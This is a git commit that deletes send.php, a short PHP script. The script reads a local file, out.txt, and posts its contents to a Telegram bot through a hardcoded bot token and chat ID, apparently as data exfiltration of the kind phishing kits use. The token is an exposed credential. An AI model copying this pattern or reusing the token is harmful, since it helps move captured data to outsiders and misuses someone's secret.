7340145d0434babd5de4dcb1155b654adb45c5f0
notroon <notroon2@gmail.com>
2021-01-20 23:38:45 +0330

    Delete send.php

--- send.php
+++
@@ -1,5 +0,0 @@
-<?php
-    sleep(2);
-    $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/bot1536881239:AAEVYG8k3ecux8zI5ywu-LH1ylmLrS6pN1M/sendMessage?chat_id=1436305942&text=$msg");
-?>
